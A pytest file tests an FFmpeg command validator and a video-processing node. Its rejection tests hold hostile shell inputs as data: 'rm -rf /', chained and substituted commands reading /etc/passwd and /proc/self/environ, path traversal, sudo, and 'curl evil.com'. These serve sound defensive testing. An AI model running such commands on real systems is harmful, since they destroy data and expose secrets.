"""Tests para Video Node + FFmpeg Validator — Micro-fase 5.5"""

import pytest
from src.nodes.video.ffmpeg_validator import FFmpegValidator, ValidationResult
from src.nodes.video.service import VideoNode


class TestFFmpegValidatorSafe:
    """Tests para comandos seguros que deben pasar."""

    def setup_method(self):
        self.validator = FFmpegValidator()

    def test_simple_trim(self):
        result = self.validator.validate(
            "ffmpeg -i input.mp4 -ss 00:02:00 -to 00:05:00 -c copy output.mp4"
        )
        assert result.is_valid is True

    def test_concat(self):
        result = self.validator.validate(
            "ffmpeg -i part1.mp4 -i part2.mp4 -filter_complex concat=n=2 output.mp4"
        )
        assert result.is_valid is True

    def test_ffprobe_allowed(self):
        result = self.validator.validate(
            "ffprobe -i input.mp4 -loglevel quiet"
        )
        assert result.is_valid is True

    def test_resize(self):
        result = self.validator.validate(
            "ffmpeg -i input.mp4 -vf scale=1280:720 output.mp4"
        )
        assert result.is_valid is True

    def test_audio_extract(self):
        result = self.validator.validate(
            "ffmpeg -i input.mp4 -vn -c:a copy output.mp3"
        )
        assert result.is_valid is True

    def test_add_subtitles(self):
        result = self.validator.validate(
            "ffmpeg -i input.mp4 -vf subtitles=subs.srt output.mp4"
        )
        assert result.is_valid is True


class TestFFmpegValidatorDangerous:
    """Tests para comandos peligrosos que DEBEN ser rechazados."""

    def setup_method(self):
        self.validator = FFmpegValidator()

    def test_overwrite_flag_blocked(self):
        result = self.validator.validate(
            "ffmpeg -y -i input.mp4 output.mp4"
        )
        assert result.is_valid is False
        assert len(result.blocked_patterns) > 0

    def test_rm_blocked(self):
        result = self.validator.validate(
            "ffmpeg -i input.mp4 output.mp4; rm -rf /"
        )
        assert result.is_valid is False

    def test_command_chain_semicolon_blocked(self):
        result = self.validator.validate(
            "ffmpeg -i input.mp4 output.mp4; echo pwned"
        )
        assert result.is_valid is False

    def test_command_chain_and_blocked(self):
        result = self.validator.validate(
            "ffmpeg -i input.mp4 output.mp4 && rm -rf /"
        )
        assert result.is_valid is False

    def test_backtick_substitution_blocked(self):
        result = self.validator.validate(
            "ffmpeg -i `cat /etc/passwd` output.mp4"
        )
        assert result.is_valid is False

    def test_dollar_substitution_blocked(self):
        result = self.validator.validate(
            "ffmpeg -i $(whoami) output.mp4"
        )
        assert result.is_valid is False

    def test_dev_access_blocked(self):
        result = self.validator.validate(
            "ffmpeg -i /dev/video0 output.mp4"
        )
        assert result.is_valid is False

    def test_etc_access_blocked(self):
        result = self.validator.validate(
            "ffmpeg -i /etc/passwd output.mp4"
        )
        assert result.is_valid is False

    def test_directory_traversal_blocked(self):
        result = self.validator.validate(
            "ffmpeg -i ../../etc/passwd output.mp4"
        )
        assert result.is_valid is False

    def test_sudo_blocked(self):
        result = self.validator.validate(
            "sudo ffmpeg -i input.mp4 output.mp4"
        )
        assert result.is_valid is False

    def test_curl_blocked(self):
        result = self.validator.validate(
            "ffmpeg -i input.mp4 output.mp4; curl evil.com"
        )
        assert result.is_valid is False

    def test_non_ffmpeg_command_blocked(self):
        result = self.validator.validate(
            "rm -rf /important/files"
        )
        assert result.is_valid is False

    def test_empty_command_blocked(self):
        result = self.validator.validate("")
        assert result.is_valid is False

    def test_variable_expansion_blocked(self):
        result = self.validator.validate(
            "ffmpeg -i ${HOME}/secret.mp4 output.mp4"
        )
        assert result.is_valid is False

    def test_proc_access_blocked(self):
        result = self.validator.validate(
            "ffmpeg -i /proc/self/environ output.mp4"
        )
        assert result.is_valid is False


class TestFFmpegValidatorOutputPath:
    """Tests para validación de paths de salida."""

    def setup_method(self):
        self.validator = FFmpegValidator()

    def test_valid_output_path(self):
        assert self.validator.validate_output_path(
            "/tmp/yeyo-video/output.mp4", "/tmp/yeyo-video"
        ) is True

    def test_outside_path_rejected(self):
        assert self.validator.validate_output_path(
            "/etc/output.mp4", "/tmp/yeyo-video"
        ) is False


class TestVideoNodeBasic:
    """Tests básicos del VideoNode."""

    def test_node_name(self):
        node = VideoNode()
        assert node.name == "Video"

    @pytest.mark.asyncio
    async def test_initialize_creates_temp_dir(self):
        node = VideoNode()
        await node.initialize()
        assert node._temp_dir is not None
        assert node._temp_dir.exists()
        await node.cleanup()

    @pytest.mark.asyncio
    async def test_cleanup_removes_temp_dir(self):
        node = VideoNode()
        await node.initialize()
        temp = node._temp_dir
        await node.cleanup()
        assert not temp.exists()

    @pytest.mark.asyncio
    async def test_process_empty_command(self):
        node = VideoNode()
        result = await node.process({"command": "", "action": "process"})
        assert "error" in result

    def test_get_job_status_not_found(self):
        node = VideoNode()
        result = node._get_job_status("fake-id")
        assert "error" in result
